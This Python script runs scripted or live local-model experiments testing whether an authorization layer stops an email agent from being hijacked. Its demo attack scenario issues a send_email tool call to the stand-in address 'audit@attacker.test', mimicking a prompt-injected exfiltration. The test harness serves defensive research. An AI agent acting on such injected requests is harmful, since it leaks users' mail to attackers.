"""Run deterministic authorization demos or a live local-model experiment."""
import argparse
import json
from pathlib import Path
from uuid import uuid4
from tools import Executor
from evaluation import write_report


def run_experiment(*, mode="demo", scenario="attack", guarded=True, model=None, output_root=Path("runs")):
    output = Path(output_root) / uuid4().hex
    executor = Executor(output, attack=scenario == "attack", guarded=guarded)
    error = None
    try:
        if mode == "demo":
            executor.execute("read_email", {"email_id": "email_001"})
            if scenario == "attack":
                executor.execute("send_email", {"email_id": "email_001", "to": "audit@attacker.test", "body": "I can attend."})
            else:
                executor.execute("save_draft", {"email_id": "email_001", "body": "I can attend."})
        else:
            from agent import run
            run(executor, model)
    except Exception as exc:
        error = exc
        raise
    finally:
        report = write_report(executor, mode=mode, scenario=scenario, model=model, error=error)
        print(json.dumps(report, indent=2))
        print(f"Run artifacts: {output.resolve()}")
    return report

def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--mode", choices=["demo", "ollama"], default="demo")
    parser.add_argument("--scenario", choices=["normal", "attack"], default="attack")
    parser.add_argument("--unguarded", action="store_true", help="Disable authorization for local comparison")
    parser.add_argument("--model", help="Installed Ollama model supporting tool calling")
    parser.add_argument("--compare", action="store_true", help="Run normal/attack scenarios with authorization enabled and disabled")
    parser.add_argument("--repeat", type=int, default=1, help="Repetitions of each selected configuration")
    args = parser.parse_args()
    if args.mode == "ollama" and not args.model:
        parser.error("--model is required in ollama mode")
    if args.repeat < 1:
        parser.error("--repeat must be positive")
    if args.mode == "demo":
        print("SCRIPTED DEMO: injected tool requests, not evidence of model susceptibility.")
    configurations = [(scenario, guarded) for scenario in ("normal", "attack") for guarded in (True, False)] if args.compare else [(args.scenario, not args.unguarded)]
    for scenario, guarded in configurations:
        for _ in range(args.repeat):
            run_experiment(mode=args.mode, scenario=scenario, guarded=guarded, model=args.model)

if __name__ == "__main__":
    main()
